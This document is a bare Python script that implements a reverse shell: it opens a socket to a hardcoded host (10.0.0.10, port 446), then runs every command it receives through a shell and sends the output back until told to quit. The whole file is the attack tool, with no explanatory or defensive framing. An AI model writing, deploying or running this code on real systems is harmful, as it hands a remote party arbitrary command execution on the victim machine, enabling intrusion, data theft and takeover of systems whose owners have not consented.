#!/usr/bin/python

import subprocess, socket

HOST =  "10.0.0.10"
PORT = 446

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
s.send("Connection established\n")

while True:
    data = s.recv(1024)
    if data == "quit\n": break
    else:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdoutput = proc.stdout.read() + proc.stderr.read()
        s.send(stdoutput)

s.send("Qutting current session\n")
s.close()
quit()
